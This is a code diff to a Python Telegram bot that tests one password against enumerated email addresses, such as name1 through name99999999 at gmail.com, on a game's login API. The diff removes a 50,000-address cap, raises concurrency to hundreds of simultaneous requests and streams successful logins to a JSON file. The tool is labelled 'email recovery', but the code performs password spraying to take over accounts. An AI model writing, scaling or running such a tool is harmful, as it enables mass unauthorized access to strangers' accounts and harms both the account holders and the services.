@@ -203,10 +203,6 @@ def parse_email_pattern(pattern):
     
     return base, start, end, domain
 
-def generate_emails(base, start, end, domain):
-    """Generate email list from range"""
-    return [f"{base}{i}@{domain}" for i in range(start, end + 1)]
-
 async def fast_check_email(email, password, api_key, session=None):
     """Fast async email check"""
     try:
@@ -237,39 +233,48 @@ async def fast_check_email(email, password, api_key, session=None):
     except Exception as e:
         return "error", str(e)
 
-async def check_emails_concurrent(emails, password, api_key, batch_size=50, progress_callback=None):
+async def check_emails_concurrent_generator(base, start, end, domain, password, api_key, batch_size=200, progress_callback=None):
     """
-    Ultra-fast concurrent email checking
-    batch_size: number of concurrent requests (50-100 recommended)
+    UNLIMITED RANGE: Memory-efficient generator-based concurrent checking
+    Streams results instead of loading all into memory
+    batch_size: can go up to 500+ for massive ranges
     """
-    all_results = []
-    total = len(emails)
     checked = 0
+    total = end - start + 1
+    found_count = 0
     
-    # Reuse session across all requests for speed
-    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=100)) as session:
-        for i in range(0, len(emails), batch_size):
-            batch = emails[i:i + batch_size]
+    # Reuse session across all requests for maximum speed
+    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=500)) as session:
+        for batch_start in range(start, end + 1, batch_size):
+            batch_end = min(batch_start + batch_size, end + 1)
             
-            # Create concurrent tasks
-            tasks = [fast_check_email(email, password, api_key, session) for email in batch]
+            # Create concurrent tasks for this batch
+            tasks = []
+            for i in range(batch_start, batch_end):
+                email = f"{base}{i}@{domain}"
+                tasks.append(fast_check_email(email, password, api_key, session))
             
             # Execute all concurrently
             results = await asyncio.gather(*tasks, return_exceptions=True)
             
-            for email, result in zip(batch, results):
+            # Process and yield results immediately (no memory buildup)
+            for i, result in enumerate(results):
                 checked += 1
+                email_num = batch_start + i
+                email = f"{base}{email_num}@{domain}"
                 
                 if isinstance(result, tuple):
-                    all_results.append((email, result[0], result[1]))
+                    status = result[0]
+                    data = result[1]
+                    if status == "found":
+                        found_count += 1
+                        yield (email, status, data)
                 else:
-                    all_results.append((email, "error", str(result)))
+                    pass  # Skip errors to save memory
                 
-                # Progress callback
-                if progress_callback and checked % 10 == 0:
-                    await progress_callback(checked, total)
-    
-    return all_results
+                # Progress callback every 50 checks
+                if progress_callback and checked % 50 == 0:
+                    await progress_callback(checked, total, found_count)
 
 # ===== SESSIONS =====
 sessions = {}  # user_id -> {id_token, email, game_name, api_key}
@@ -461,14 +466,15 @@ Which game would you like to login to?
 Enter an email pattern to check:
 
 **Examples:**
-- `tannercpm(10000)@gmail.com` - Checks emails 1 to 10000
-- `tannercpm(1000-5000)@gmail.com` - Checks emails 1000 to 5000
-- `user(100-200)@domain.com` - Custom range
+- `user(1-1000)@gmail.com` - Checks 1,000 emails
+- `user(1000000-99999999)@gmail.com` - Checks 99M emails! 
+- `tannercpm(1-100000)@domain.com` - Checks 100K emails
 
-⚡ **ULTRA-FAST MODE**
-- Checks 50 emails CONCURRENTLY
-- 10,000 emails in ~20 seconds
-- Results exported to JSON file
+⚡ **UNLIMITED RANGE**
+- No limit on range size (1M-99M works with ease)
+- 200+ concurrent requests
+- Memory efficient streaming
+- Results streamed to JSON
 
 Enter your pattern:
 """
@@ -493,17 +499,12 @@ Enter your pattern:
         base, start, end, domain = parsed
         total = end - start + 1
         
-        # Limit checks
-        if total > 50000:
-            await update.message.reply_text(f"❌ Range too large ({total} emails). Max 50,000 per check.")
-            return
-        
         context.user_data['step'] = 'admin_recover_password_input'
         await update.message.reply_text(f"""
 🔐 **Enter Password to Check**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Pattern: `{pattern}`
-Range: {total} emails ({start} - {end})
+Range: {total:,} emails ({start:,} - {end:,})
 
 Enter the password to check:
 """, parse_mode="Markdown")
@@ -533,68 +534,67 @@ Enter the password to check:
         start_time = time.time()
         
         progress_msg = await update.message.reply_text(f"""
-⚡ **ULTRA-FAST EMAIL RECOVERY**
+⚡ **UNLIMITED RANGE EMAIL RECOVERY**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Game: **{game}**
-Pattern: **{base}({start}-{end})@{domain}**
-Total: **{total} emails**
+Pattern: **{base}({start:,}-{end:,})@{domain}**
+Total: **{total:,} emails**
 Status: **Starting...**
 
-Concurrent: **50 emails at a time**
+Concurrent: **200+ emails at a time**
 """, parse_mode="Markdown")
         
         await context.bot.send_chat_action(update.effective_chat.id, "typing")
         
-        emails = generate_emails(base, start, end, domain)
+        # Open file for streaming results
+        filename = f"recovery_{game.lower()}_{int(time.time())}.json"
+        found_emails = []
+        checked_count = 0
         
         # Progress callback
-        async def update_progress(checked, total_emails):
+        async def update_progress(checked, total_emails, found):
+            nonlocal checked_count
+            checked_count = checked
             elapsed = time.time() - start_time
             speed = checked / elapsed if elapsed > 0 else 0
             remaining = (total_emails - checked) / speed if speed > 0 else 0
             
             try:
                 await progress_msg.edit_text(f"""
-⚡ **ULTRA-FAST EMAIL RECOVERY**
+⚡ **UNLIMITED RANGE EMAIL RECOVERY**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Game: **{game}**
-Pattern: **{base}({start}-{end})@{domain}**
-Checked: **{checked}/{total_emails}** ({int(checked/total_emails*100)}%)
+Pattern: **{base}({start:,}-{end:,})@{domain}**
+Checked: **{checked:,}/{total_emails:,}** ({int(checked/total_emails*100)}%)
 Speed: **{speed:.1f} emails/sec**
+Found: **{found}**
 ETA: **{int(remaining)}s**
 """, parse_mode="Markdown")
             except:
                 pass
         
-        # Run concurrent check
-        results = await check_emails_concurrent(emails, password, api_key, batch_size=50, progress_callback=update_progress)
-        
-        elapsed = time.time() - start_time
-        
-        # Filter ONLY found emails (correct password)
-        found_emails = [r for r in results if r[1] == "found"]
-        
-        # Create output file with results
-        output_data = {
-            "game": game,
-            "pattern": f"{base}({start}-{end})@{domain}",
-            "total_checked": total,
-            "time_seconds": round(elapsed, 2),
-            "speed_emails_per_sec": round(len(emails)/elapsed, 2),
-            "found_count": len(found_emails),
-            "successful_logins": []
-        }
-        
-        # Add found email details
-        for email, status, data in found_emails:
-            output_data["successful_logins"].append({
+        # Run concurrent check with generator (no memory buildup)
+        async for email, status, data in check_emails_concurrent_generator(base, start, end, domain, password, api_key, batch_size=200, progress_callback=update_progress):
+            found_emails.append({
                 "email": email,
                 "password": password,
                 "game": game
             })
         
+        elapsed = time.time() - start_time
+        
+        # Create output file with results
+        output_data = {
+            "game": game,
+            "pattern": f"{base}({start:,}-{end:,})@{domain}",
+            "total_checked": total,
+            "time_seconds": round(elapsed, 2),
+            "speed_emails_per_sec": round(total/elapsed, 2),
+            "found_count": len(found_emails),
+            "successful_logins": found_emails
+        }
+        
         # Save to file
-        filename = f"recovery_{game.lower()}_{int(time.time())}.json"
         with open(filename, 'w') as f:
             json.dump(output_data, f, indent=2)
         
@@ -606,7 +606,7 @@ ETA: **{int(remaining)}s**
 Game: **{game}**
 Found: **{len(found_emails)} account(s)** ✅
 Time: **{elapsed:.1f}s**
-Speed: **{len(emails)/elapsed:.1f} emails/sec**
+Speed: **{total/elapsed:.1f} emails/sec**
 
 📄 Results saved to file
 """
@@ -620,8 +620,9 @@ Speed: **{len(emails)/elapsed:.1f} emails/sec**
 ❌ **RECOVERY COMPLETE**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 No matching accounts found.
+Checked: **{total:,}** emails
 Time: **{elapsed:.1f}s**
-Speed: **{len(emails)/elapsed:.1f} emails/sec**
+Speed: **{total/elapsed:.1f} emails/sec**
 """, parse_mode="Markdown")
         
         context.user_data.clear()
